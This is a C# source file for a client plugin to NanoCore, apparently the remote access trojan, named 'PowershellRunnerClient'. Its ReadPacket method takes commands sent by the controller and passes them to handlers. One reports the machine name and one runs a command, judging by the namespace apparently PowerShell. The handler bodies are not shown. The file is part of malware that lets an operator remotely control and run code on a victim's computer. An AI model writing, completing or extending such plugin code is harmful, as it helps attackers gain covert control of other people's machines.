using NanoCore.ClientPlugin;
using NanoCore.ClientPluginHost;

namespace PowershellRunnerClient
{
    public class ClientPlugin : IClientNetwork
	{
		private CommandHandlers commandHandlers = new CommandHandlers();

		public ClientPlugin(IClientLoggingHost _loggingHost, IClientNetworkHost _networkHost)
		{
			ClientMain.LoggingHost = _loggingHost;
			ClientMain.NetworkHost = _networkHost;
			ClientMain.InitializePlugin();
		}

		public void BuildingHostCache()
		{
		}

		public void ConnectionFailed(string host, ushort port)
		{
		}

		public void ConnectionStateChanged(bool connected)
		{
		}

		public void PipeClosed(string pipeName)
		{
		}

		public void PipeCreated(string pipeName)
		{
		}

		public void ReadPacket(string pipeName, object[] @params)
		{
			switch ((CommandTypes)@params[0])
			{
				case CommandTypes.MachineName:
					commandHandlers.HandleMachineName(@params);
					break;
				case CommandTypes.Run:
					commandHandlers.HandleRun(@params);
					break;
			}
		}
	}
}